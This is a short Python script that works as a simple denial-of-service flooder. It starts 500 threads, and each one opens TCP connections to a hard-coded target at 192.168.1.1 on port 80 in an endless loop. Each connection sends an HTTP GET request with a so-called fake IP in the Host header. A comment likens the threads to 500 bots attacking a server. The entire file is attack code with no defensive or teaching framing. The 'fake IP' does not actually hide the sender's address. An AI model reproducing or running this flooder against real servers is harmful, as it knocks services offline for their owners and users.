import socket
import threading

target = '192.168.1.1'
fake_ip = '182.21.20.32'
port = 80

attack_num = 0
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        s.close()

#creating 500 threads to run the attackfunction (like creating 500 bots to attack the server at the same time)
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()        


